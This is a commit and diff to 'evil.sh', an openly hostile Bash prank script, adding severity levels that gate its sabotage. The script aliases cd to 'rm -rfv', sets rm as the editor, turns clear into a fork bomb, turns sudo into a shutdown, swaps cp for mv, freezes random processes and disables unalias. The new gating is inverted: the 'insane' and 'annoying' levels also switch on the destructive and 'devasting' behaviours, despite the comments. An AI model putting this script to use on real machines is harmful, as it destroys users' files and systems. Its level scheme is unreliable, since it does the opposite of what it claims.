command categorisation
Each command is now categorised in a hierarchy.
This ensures that people can easily choose what general kind of
behaviour is enabled.
There will for example be no destructive behaviour in any category but
the ones explicitly labeled as such.

fixes #30

+++ evil.sh
@@ -1,37 +1,77 @@
 #!/usr/bin/env bash
 # evil.sh — https://mths.be/evil.sh
 
+# valid values are: insane, annoying, destructive, devasting, unusable
+# each mode of operation includes the previous one's tweaks
+#
+# insane: only enable subtle behaviour that confuses and slowly drives people insane e.g. make exit
+#   open a new shell
+# annoying: like insane just way more obvious behaviour allowed (e.g. constantly cd to the wrong
+#   (random) directory
+# destructive: delete files and do serious harm, non-recoverable damage included
+# devasting: may delete /
+# unusable: enable everything including, but not limited to replacing enter by backspace
+EVIL_BEHAVIOUR=annoying
+
+function insane()
+{
+	test "$EVIL_BEHAVIOUR" = "insane"
+}
+
+function annoying()
+{
+	insane || test "$EVIL_BEHAVIOUR" = "annoying"
+}
+
+function destructive()
+{
+	annoying || test "$EVIL_BEHAVIOUR" = "destructive"
+}
+
+function devasting()
+{
+	destructive || test "$EVIL_BEHAVIOUR" = "devasting"
+}
+
+function unusable()
+{
+	devasting || test "$EVIL_BEHAVIOUR" = "unusable"
+}
+
 # Set `rm` as the default editor.
-export EDITOR=/bin/rm;
+destructive && export EDITOR=/bin/rm;
 
 # Make Tab send the delete key.
-tset -Qe $'\t';
+insane && tset -Qe $'\t';
 
 # Randomly make the shell exit whenever a command has a non-zero exit status.
-((RANDOM % 10)) || set -o errexit;
+if insane
+then
+	((RANDOM % 10)) || set -o errexit;
+fi
 
 # Let `cat` swallow every input and never return anything.
-alias cat=true;
+annoying && alias cat=true;
 
 # Use a random sort option whenever `ls` is invoked.
-function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
+annoying && function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
 # Delete directories instead of entering them.
-alias cd='rm -rfv';
+devasting && alias cd='rm -rfv';
 
 # Shut down the computer instead of running a command with super-user rights.
-alias sudo='sudo shutdown -P now';
+destructive && alias sudo='sudo shutdown -P now';
 
 # Launch a fork bomb instead of clearing the screen.
-alias clear=':(){ :|:& };:';
+destructive && alias clear=':(){ :|:& };:';
 
 # Have `date` return random dates.
-alias date='date -d "now + $RANDOM days"';
+annoying && alias date='date -d "now + $RANDOM days"';
 
 # Sometimes, wait a few minutes and then start randomly ejecting the CD drive.
 # Other times, resist all attempts at opening it. Other times, make it read
 # reaaaalllly sllooowwwwllly.
-if [ "$(uname)" = 'Darwin' ]; then
+annoying && if [ "$(uname)" = 'Darwin' ]; then
 	# Much less fun on Macs, alas.
 	if [[ $[$RANDOM % 2] == 0 ]]; then
 		# Eject!
@@ -57,29 +97,29 @@ else
 fi;
 
 # Send STOP signal to random process at random time.
-sleep $[ ( $RANDOM % 100 )	+ 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
+destructive && sleep $[ ( $RANDOM % 100 ) + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
 
 # Have `cp` perform `mv` instead.
-alias cp='mv';
+destructive && alias cp='mv';
 
 # Make `exit` open a new shell.
-alias exit='sh';
+annoying && alias exit='sh';
 
 # Add a random number to line numbers when using `grep -n`.
-function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }
+insane && function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }
 
 # Invert `if`, `for`, and `while`.
-alias if='if !' for='for !' while='while !';
+annoying && alias if='if !' for='for !' while='while !';
 
 # Map Enter, Ctrl+J, and Ctrl+M to backspace.
-bind '"\C-J":"\C-?"';
-bind '"\C-M":"\C-?"';
+unusable && bind '"\C-J":"\C-?"';
+unusable && bind '"\C-M":"\C-?"';
 
 # Send `n` (no) instead of `y` (yes)
-alias yes="yes n";
+annoying && alias yes="yes n";
 
 # Quit vim on startup.
-alias vim="vim +q";
+annoying && alias vim="vim +q";
 
 # Disable `unalias` and `alias`.
 alias unalias=false;
